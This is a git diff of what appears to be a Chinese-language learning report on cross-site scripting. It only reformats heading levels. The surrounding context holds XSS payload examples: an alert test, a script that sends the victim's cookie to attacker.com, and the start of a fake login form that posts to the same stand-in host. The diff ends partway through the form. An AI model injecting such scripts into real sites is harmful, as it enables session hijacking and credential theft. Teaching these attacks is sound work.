@@ -403,12 +403,12 @@ Follow learning steps below to prepare your report:
 ```javascrpit
 alert('這是一個 XSS 攻擊！');
 ```
-### 如果網站直接渲染這段輸入，當其他用戶訪問該留言時，他們的瀏覽器會彈出一個警告框，表示 XSS 攻擊成功。      
+##### 如果網站直接渲染這段輸入，當其他用戶訪問該留言時，他們的瀏覽器會彈出一個警告框，表示 XSS 攻擊成功。      
 * 竊取 Cookie（更進一步的攻擊）：    
  ```javascript
 document.location='http://attacker.com/steal.php?cookie='+document.cookie;
 ```
-###這段腳本會將受害者的 Cookie 傳送到攻擊者的伺服器，攻擊者可利用該 Cookie 來冒充受害者的身份登入系統。      
+##### 這段腳本會將受害者的 Cookie 傳送到攻擊者的伺服器，攻擊者可利用該 Cookie 來冒充受害者的身份登入系統。      
 * 偽造登入表單：    
 ```javascript
     document.body.innerHTML = '<form action="http://attacker.com/login.php" method="POST">' +
